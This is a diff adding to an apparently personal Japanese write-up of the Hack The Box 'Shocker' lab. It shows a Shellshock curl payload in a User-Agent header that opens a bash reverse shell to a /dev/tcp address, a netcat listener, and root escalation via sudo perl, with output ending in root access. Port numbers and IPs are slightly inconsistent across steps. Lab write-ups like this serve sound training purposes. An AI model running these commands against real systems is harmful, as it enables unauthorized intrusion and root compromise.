@@ -230,7 +230,102 @@
   * なぜ「() { :;};」でコマンドが実行されるかの解説
 
     https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf
+  
+    [参考資料](https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf)
+  
+    * bashについて
+  
+      * .shで利用することができる
+      * "one-liners"で定義することができる
+  
+      ```bash
+      ┌──(kali㉿kali)-[~]
+      └─$ welcome() { echo "Hi $USER, here's the date:"; date; }
+      
+      ┌──(kali㉿kali)-[~]
+      └─$ welcome
+      Hi kali, here's the date:
+      2022年  7月  9日 土曜日 16:15:27 JST
+      ```
+  
+  * コマンド実行できるようになったのでリバースシェルを取ります。
+  
+    * kaliで443ポートで待機
+  
+      ```bash
+      ┌──(kali㉿kali)-[~]
+      └─$ nc -lvnp 4444
+      listening on [any] 4444 ...
+      ```
+  
+    * リバースシェルコマンドの実行
+  
+      ```bash
+      curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >& /dev/tcp/10.10.16.2/443 0>&1" http://10.10.10.56/cgi-bin/user.sh
+      ```
+  
+      * \>&：">& hoge.txt" は "> hoge.txt 2>&1"と同じ意味。つまり/bin/bash -i を実行したときの標準入力(0)、標準出力(1)、標準エラー(2)を/dev/tcp/10.10.14.30/443にリダイレクトしている
+  
+      * /dev/tcp/10.10.14.30/443：
+  
+        ```
+        bash は、以下の表にあるようなファイル名がリダイレクトに使用されると、それらを特別に扱います。
+        
+          /dev/tcp/host/port
+            host が有効なホスト名またはインターネットアドレスで port が整数のポート番号ならば、
+            bash は対応するソケットに対して TCP 接続のオープンを試みます。
+        
+          /dev/udp/host/port
+            host が有効なホスト名またはインターネットアドレスで port が整数のポート番号ならば、
+            bash は対応するソケットに対して UDP 接続のオープンを試みます。
+        ```
+  
+        [参考サイト](https://hogem.hatenablog.com/entry/20141008/1412778085)
+  
+  * root escalation
+  
+    * カレントユーザのsudoパーミッションを確認する。
+  
+    ```bash
+    shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
+    sudo -l
+    Matching Defaults entries for shelly on Shocker:
+        env_reset, mail_badpass,
+        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+    
+    User shelly may run the following commands on Shocker:
+        (root) NOPASSWD: /usr/bin/perl
+    ```
+  
+    →perlの実行権限があることがわかる。
+  
+  * perlで/bin/shを取得する
+  
+    ```bash
+    sudo perl -e 'exec "/bin/sh";'
+    ```
+  
+    ```bash
+    ──(kali㉿kali)-[~/Documents/HTB/Shocker]
+    └─$ nc -lvnp 443                                                                                                       
+    listening on [any] 443 ...
+    connect to [10.10.16.2] from (UNKNOWN) [10.10.10.56] 59428
+    bash: no job control in this shell
+    shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'exec "/bin/sh";'
+    sudo perl -e 'exec "/bin/sh";'
+    id
+    uid=0(root) gid=0(root) groups=0(root)
+    cd ~
+    ls
+    root.txt
+    cat root.txt
+    ```
+  
+    
 
 ## 所感
 
 * nmapを-sV＋-p-でやるとものすごく時間かかるのでやめる。
+
+* 難しい。まだまだ能力が足りない。全部終わるのになんだかんだ5-6時間かかってしまった。悲しい。コマンドの理解も十分ではない。研鑽を積んでいきたい。
+* tcpポートでのリバースシェルの実行方法は有効活用できそうなのでぜひ覚えること
